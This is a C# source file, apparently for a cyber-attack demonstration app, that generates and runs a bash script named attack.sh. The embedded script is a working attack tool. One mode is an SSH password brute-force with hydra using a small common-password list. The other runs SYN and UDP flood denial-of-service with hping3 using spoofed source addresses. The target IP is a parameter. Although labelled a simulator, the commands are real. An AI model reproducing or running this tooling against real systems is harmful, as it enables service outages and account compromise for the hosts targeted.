using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        // \u30ed\u30b0\u51fa\u529b\u30a4\u30d9\u30f3\u30c8\uff08UI\u306b\u901a\u77e5\u3059\u308b\u305f\u3081\uff09
        public event Action<string>? OnLogReceived;
        
        public const string AttackScriptName = @"./Attack/attack.sh";

        // \u5916\u90e8\u30b3\u30de\u30f3\u30c9\u5b9f\u884c (timeoutSeconds\u5f15\u6570\u3092\u8ffd\u52a0)
        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                // \u6a19\u6e96\u51fa\u529b
                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        // \u3053\u3053\u3067\u7ffb\u8a33\u30ed\u30b8\u30c3\u30af\u3092\u901a\u3059
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                // \u30a8\u30e9\u30fc\u51fa\u529b
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    if (timeoutSeconds > 0)
                    {
                        // \u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u8a2d\u5b9a\u304c\u3042\u308b\u5834\u5408
                        // \u30b9\u30af\u30ea\u30d7\u30c8\u81ea\u4f53\u306e\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u3088\u308a\u5c11\u3057\u4f59\u88d5\u3092\u6301\u305f\u305b\u308b (+2\u79d2)
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
                        try
                        {
                            // \u6307\u5b9a\u6642\u9593\u5f85\u6a5f
                            await process.WaitForExitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            // \u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u3057\u305f\u5834\u5408
                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill...");
                            try
                            {
                                // \u30d7\u30ed\u30bb\u30b9\u30c4\u30ea\u30fc\u3054\u3068\u5f37\u5236\u7d42\u4e86
                                process.Kill(true);
                            }
                            catch (Exception kex)
                            {
                                OnLogReceived?.Invoke($"[ERROR] Failed to kill process: {kex.Message}");
                            }
                        }
                    }
                    else
                    {
                        // \u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u306a\u3057
                        await process.WaitForExitAsync();
                    }
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
                
                // \u30c7\u30e2\u7528\u30d5\u30a9\u30fc\u30eb\u30d0\u30c3\u30af\u30e1\u30c3\u30bb\u30fc\u30b8
                await Task.Delay(1000);
                if (command.Contains("bash") || args.Contains("attack.sh"))
                {
                     OnLogReceived?.Invoke("[SIMULATION] Executing shell script sequence...");
                }
                else
                {
                    OnLogReceived?.Invoke("Target appears to be secure or tool not installed.");
                }
            }
        }

        // \u653b\u6483\u7528\u30b7\u30a7\u30eb\u30b9\u30af\u30ea\u30d7\u30c8\u306e\u751f\u6210
        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                // \u30d5\u30a1\u30a4\u30eb\u3092\u5e38\u306b\u6700\u65b0\u306e\u5185\u5bb9\u3067\u4e0a\u66f8\u304d\u66f4\u65b0\u3059\u308b
                {
                    string scriptContent = @"#!/bin/bash

# root\u6a29\u9650\u30c1\u30a7\u30c3\u30af
if [ ""$EUID"" -ne 0 ]; then
  echo ""\u30a8\u30e9\u30fc: root\u6a29\u9650\u3067\u5b9f\u884c\u3057\u3066\u304f\u3060\u3055\u3044\u3002""
  exit 1
fi

TARGET_IP=${1:-""127.0.0.1""}
DURATION=${2:-""15""}
MODE_ARG=${3:-""dos""}
SSH_USER=${4:-""root""}

PORT=80
THREADS=4

cleanup() {
    echo """"
    echo ""[!] \u505c\u6b62\u30b7\u30b0\u30ca\u30eb\u3092\u53d7\u4fe1\u3057\u307e\u3057\u305f\u3002\u30d7\u30ed\u30bb\u30b9\u3092\u505c\u6b62\u4e2d...""
    pkill -P $$ hping3
    pkill -P $$ hydra
    echo ""[*] \u5b8c\u4e86\u3002""
    exit
}

trap cleanup SIGINT SIGTERM EXIT

echo ""==========================================""
echo ""   Cyber Attack Simulator Script""
echo ""==========================================""
echo ""[*] TARGET: $TARGET_IP""
echo ""[*] DURATION: $DURATION sec""
echo ""[*] MODE: $MODE_ARG""
echo ""------------------------------------------""

if [ ""$MODE_ARG"" = ""hydra"" ]; then
    # --- Hydra SSH Crack ---
    echo ""[*] Starting Hydra SSH Password Cracking...""
    echo ""[*] Target User: $SSH_USER""
    
    # \u30c7\u30e2\u7528\u30d1\u30b9\u30ef\u30fc\u30c9\u30ea\u30b9\u30c8\u4f5c\u6210
    echo ""123456"" > passlist.txt
    echo ""password"" >> passlist.txt
    echo ""admin"" >> passlist.txt
    echo ""root"" >> passlist.txt
    echo ""kali"" >> passlist.txt
    
    # Hydra\u5b9f\u884c (\u30e6\u30fc\u30b6\u30fc\u540d\u3092\u5f15\u6570\u304b\u3089\u6307\u5b9a)
    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
    
    rm passlist.txt

else
    # --- DoS Attack (hping3) ---
    echo ""[*] Starting DoS Flood Attack...""
    
    for (( i=1; i<=THREADS; i++ ))
    do
        # TCP SYN Flood
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
        # UDP Flood
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    done
    
    wait
fi
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    
                    OnLogReceived?.Invoke($"[SYSTEM] Updated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}